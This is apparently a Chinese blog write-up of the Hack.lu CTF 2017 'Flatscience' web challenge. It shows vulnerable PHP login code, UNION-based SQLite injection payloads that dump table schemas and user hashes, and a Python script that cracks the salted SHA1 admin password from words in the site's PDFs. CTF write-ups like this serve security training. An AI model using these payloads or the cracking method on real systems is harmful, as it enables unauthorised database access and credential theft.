---
title: "Hack.lu CTF 2017-Flatscience-writeup"
categories: [ "CTF" ]
tags: [ "CTF","CTF writeup" ]
draft: false
slug: "6"
date: "2018-12-17 20:12:00"
---

- 为什么要写 2017 年的题的 writeup：因为在做某 CTF 训练平台的题，照着 Chybeta 大佬的 writeup 做了一遍

首先，给我们分配了一个地址和端口号，打开看一下：

![][1]

分别点一下，好像都差不多，全部都会跳转到各种英文的 pdf，看不懂，那就走流程吧：

- 源码：没啥特殊的
- robots.txt：有发现

  ![][2]

- 分析流量：由于上一步 robots.txt 有发现所以这一步就省了（此处只是为了说明常见** ctf 的题 web 处理步骤三部曲 **）

可以看到一个`login.php`，一个`admin.php`

`login.php`：

![][3]

`admin.php`：

![][4]

看一下`login.php`的源代码，发现提示：

![][5]

一个待办事项：删除?debug 参数

哦~作者注释要删掉，那我们看一下删掉没(假装不知道)，发现没删掉：

![][6]

而且发现就是这个页面的源代码：

```
<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');

        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
```

可以看到这个源代码

- 将 POST 进去的 usr 和 pw 参数不做任何过滤，带入 sql 查询(数据库为 sqllite，就要想到 sqlite 的系统表为 sqlite_master)。

- 若查询的结果 id 字段不为空，则执行 setcookie 操作，会将查询的结果 name 字段插入到 cookie 中。

那么知道了查询语句执行的操作之后，我们就要准备 SQL 注入查询点东西了，先看下原来发包的格式
![][7]
![][8]

- 构造 post:
  `usr=%27 UNION SELECT name, sql from sqlite_master--+&pw=soap`
- sql 注入的结果是：
  `SELECT id,name from Users where name='' union select name, sql from sqlite_master-- and password= 'soap'`
  id 值其实是表的名字（name），而得到的 name 值其实是创建表时的语句（sql）。
  ![][9]

- Tips:从这个查询结果我们可以看出，只返回第二个字段处的值

URL 解码，%2C 转为回车，得到 sql 语句：

```
CREATE TABLE Users(
id int primary key,
name varchar(255),
password varchar(255),
hint varchar(255)
)
```

- 从这个语句我们知道当前表是 Users 表，有四列，结合前面的只返回第二个位置的值我们可以构造如下注入语句

```
usr=%27 UNION SELECT id, id from Users limit 0,1--+&pw=soap
usr=%27 UNION SELECT id, name from Users limit 0,1--+&pw=soap
usr=%27 UNION SELECT id, password from Users limit 0,1--+&pw=soap
usr=%27 UNION SELECT id, hint from Users limit 0,1--+&pw=soap
```

通过偏移(也就是后面的 limit 0,1;limit 1,1;limit 2,1)，可以得到如下数据：
| name | password | hint |
| ----- | ------------------------------ | ------------------------------- |
| admin | 3fab54a50e770d830c0416df817567662a9dc85c | my fav word in my fav paper?! |
| fritze | 54eae8935c90f467427f05e4ece82cf569f89507 | my love is…? |
| hansi | 34b0bb7c304949f9ff2fc101eef0f048be10d3bd | the password is password |

- 发现能够解开 2，3 的 sha1，而 1 的 sha1 无法解开。表的信息都有了,flag 呢？

结合源码：

```
$res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
```

和 hint：`my fav word in my fav paper?!`意思让你在网站的所有 pdf 中找到最喜欢的词

将网站上的所有 pdf 下载下来，我们这里用 wget 递归下载：`wget xxx.com -r -np -nd -A .pdf`

- -r：层叠递归处理
- -np：不向上（url 路径）递归
- -nd：不创建和 web 网站相同（url 路径）的目录结构
- -A type：文件类型
  ![][10]

然后我们需要提取所有 pdf 中的单词，并挨个拿去做 sha1(\$pass."Salz!")操作，如果值和 admin 的密码的 sha1 相等，则是出题人最喜欢的单词，大佬们都是用 python 去转换 pdf 获取 text，我这里使用了一个小工具：`PDF Shaper Pro` [蓝奏网盘下载][11]

里面有 pdf 转换为 text 的功能，但是可能会有一点点识别错误以及换行处字符缺失问题：

![][12]

但是我们只是找一个单词，为了节约时间可以这么做：

![][13]

如果找不到再上 Python 脚本嘛：[传送门][14]

解决了文本问题，那么就只需要 os 库遍历目录下所有文本文件，re 匹配出所有单词拿去比较就 OK 了，脚本如下：

```
# !/usr/bin/python
# -  *  - coding:utf-8 -  *  -
'''
@author: soapffz
@fucntion:
@time: 2018-12-17
'''

import os
import re
import hashlib


def get_words():
    txt_name_list = [i for i in os.listdir("Tmp")] # 获得所有txt名字
    os.chdir("Tmp")  # 切换工作目录
    words_list = []  # 存放不重复的所有txt的单词
    for i in range(len(txt_name_list)):
        with open(txt_name_list[i], 'r')as f:
            words = re.findall('[A-Za-z]+', f.read())  # 正则表达式匹配单词
            for i in words:  # 这里生成的words是一个列表，不能直接加入到words_list，不然就变成二层列表了
                if i not in words_list:
                    words_list.append(i)
    return words_list


def find_passwd():
    words_list = get_words()
    for word in words_list:
        sha1_password = hashlib.sha1(
            (word + "Salz!").encode()).hexdigest()  # 这里需用encode()转化为bytes格式
        if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
            print("Find the password :" + word)
            exit()


if __name__ == "__main__":
    find_passwd()


```

运气不错，找到了匹配值：

![][15]

得到 admin 密码为：`ThinJerboa`

访问 `admin.php` 登陆得到 flag：

![][16]

`flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}`

- 文章参考链接：https://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/

[1]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_201424.png
[2]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_201910.png
[3]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_202110.png
[4]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_202206.png
[5]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_202314.png
[6]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_202612.png
[7]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_203925.png
[8]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_204003.png
[9]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_204708.png
[10]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_222327.png
[11]: https://www.lanzous.com/i2mvv1c
[12]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_231210.png
[13]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_225602.png
[14]: https://soapffz.com/python/9.html
[15]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181218_005528.png
[16]: https://img.soapffz.com/archives_img/2018/12/17/archives_20181217_222714.png